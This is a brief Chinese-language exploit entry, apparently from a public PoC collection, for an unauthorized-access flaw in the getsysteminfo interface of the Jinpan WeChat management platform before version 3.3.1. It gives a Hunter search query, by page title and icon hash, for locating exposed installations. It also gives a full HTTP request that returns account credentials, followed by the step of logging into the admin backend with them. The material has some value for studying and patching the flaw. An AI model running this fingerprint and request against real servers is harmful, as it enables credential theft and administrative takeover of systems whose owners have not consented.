# 金盘微信管理平台getsysteminfo接口未授权访问漏洞

# 一、漏洞简介
金盘 微信管理平台 getsysteminfo接口存在未授权访问漏洞，攻击者通过漏洞可以获取账号密码信息，获取后台管理员权限。

# 二、影响班额本
+ 金盘微信管理平台<3.3.1

# 三、资产测绘
+ hunter`web.title="微信管理后台"&&web.icon=="0488faca4c19046b94d07c3ee83cf9d6"`
+ 登录页面


# 四、漏洞复现
通过`poc`获取账号密码

```plain
GET /admin/weichatcfg/getsysteminfo HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


通过获取的账号密码登录后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fosg83r3n5fm40nv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
